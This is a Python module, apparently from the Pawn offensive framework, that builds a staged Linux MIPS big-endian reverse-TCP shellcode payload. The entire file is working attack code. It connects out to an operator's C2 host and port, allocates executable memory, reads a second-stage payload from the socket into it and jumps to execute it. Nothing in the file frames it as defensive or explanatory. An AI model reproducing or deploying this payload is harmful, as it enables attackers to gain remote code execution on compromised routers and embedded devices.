"""
This module requires Pawn: https://github.com/EntySec/Pawn
Current source: https://github.com/EntySec/Pawn
"""

from textwrap import dedent

from pex.assembler import Assembler
from pex.socket import Socket

from pawn.lib.module import Module


class PawnModule(Module, Socket, Assembler):
    def __init__(self):
        super().__init__()

        self.details = {
            'Name': "linux/mipsbe/reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer'
            ],
            'Architecture': "mipsbe",
            'Platform': "linux",
            'SendSize': False,
        }

    def run(self, host: str, port: int, reliable: bool = True) -> bytes:
        host = self.pack_host(host)
        port = self.pack_port(port)

        payload = dedent(f"""\
            start:
                /*
                 * Set up socket for further communication with C2
                 * socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
                 */

                li $t7, -6
                nor $t7, $t7, $zero
                addi $a0, $t7, -3
                addi $a1, $t7, -3
                slti $a2, $zero, -1
                li $v0, 4183
                syscall 0x40404
        """)

        if reliable:
            payload += dedent("""\
                    slt $s0, $zero, $a3
                    bne $s0, $zero, fail
            """)

        payload += dedent(f"""\
                /* Save sockfd on stack */
                sw $v0, -4($sp)

                /*
                 * Connect to the C2 server
                 * connect(rdi, {{sa_family=AF_INET, sin_port=htons(port), sin_addr=inet_addr(host)}}, 16)
                 */

                lw $a0, -4($sp)
                li $t7, -3
                nor $t7, $t7, $zero
                sw $t7, -32($sp)
                lui $t6, 0x{port.hex()}
                sw $t6, -28($sp)
                lui $t6, {host[:2].hex()}
                ori $t6, $t6, {host[2:].hex()}
                sw $t6, -26($sp)
                addiu $a1, $sp, -30
                li $t4, -17
                nor $a2, $t4, $zero
                li $v0, 4170
                syscall 0x40404
        """)

        if reliable:
            payload += dedent("""\
                    slt $s0, $zero, $a3
                    bne $s0, $zero, fail
            """)

        payload += dedent(f"""\
                /*
                 * Allocate space in memory for our phase
                 * mmap(0xffffffff, length, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
                 */

                li $a0, -1
                li $a1, 4097
                addi $a1, $a1, -1
                li $t1, -8
                nor $t1, $t1, $0
                add $a2, $t1, $0
                li $a3, 2050
                li $t3, -22
                nor $t3, $t3, $zero
                add $t3, $sp, $t3
                sw $0, -1($t3)
                sw $2, -5($t3)
                li $v0, 4090
                syscall 0x40404
        """)

        if reliable:
            payload += dedent("""\
                    slt $a0, $zero, $a3
                    bne $s0, $zero, fail
            """)

        payload += dedent(f"""\
                /* Save address of allocated memory on stack */
                sw $v0, -8($sp)

                lw $a0, -4($sp)
                lw $a1, -8($sp)
                li $a2, 4097
                addi $a2, $a2, -1
                li $v0, 4003
                syscall 0x40404
        """)

        if reliable:
            payload += dedent("""\
                    slt $a0, $zero, $a3
                    bne $s0, $zero, fail
            """)

        payload += dedent("""\
            /*
             * Perform cacheflush() on target buffer
             * cacheflush(addr, nbytes, DCACHE)
             */

            lw $a0, -8($sp)
            add $a1, $v0, $zero
            li $t1, -3
            nor $t1, $t1, $0
            add $a2, $t1, $0
            li $v0, 4147
            syscall 0x40404
        """)

        if reliable:
            payload += dedent("""\
                    slt $s0, $zero, $a3
                    bne $s0, $zero, fail
            """)

        payload += dedent("""\
                /* Jump to the next phase */

                lw $s1, -8($sp)
                lw $s2, -4($sp)
                jalr $s1
        """)

        if reliable:
            payload += dedent("""\
                /*
                 * Exit phase in case of failure
                 * exit(0)
                 */

                fail:
                    li $a0, $zero
                    li $v0, 4001
                    syscall 0x40404
            """)

        return self.assemble(
            self.details['Architecture'], payload)
